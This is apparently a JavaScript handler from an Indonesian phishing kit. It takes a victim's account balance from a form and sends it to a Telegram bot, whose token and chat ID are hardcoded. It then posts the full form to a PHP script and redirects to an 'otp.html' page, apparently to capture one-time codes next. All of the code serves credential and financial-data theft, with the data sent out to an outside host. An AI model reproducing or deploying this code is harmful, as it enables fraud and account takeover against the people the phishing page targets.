function neraike() {
  event.preventDefault();
  $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";

  // Ambil nilai saldo dari input
  var saldo = document.getElementById('saldo').value;

  // Kirim notifikasi ke Telegram
  fetch('https://api.telegram.org/bot7403024559:AAH8XFB-YgCjnNS5EzMLXdNAkmmi-QZca8M/sendMessage', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: '-1002166704403',
      text: 'Ada pengguna yang mengirimkan formulir dengan saldo terakhir: ' + saldo,
    }),
  })

  $.ajax({
    type: 'POST',
    url: 'req/saldo.php',
    data: $('#jualpuki').serialize(),
    datatype: 'text',

    complete: function(data) {
      setTimeout(function() {
        window.location.href = 'otp.html'
        document.getElementById('btnSubmit1').innerHTML = "SELANJUTNYA";
        $('.process1').fadeOut();
      }, 800);
    }
  })
}
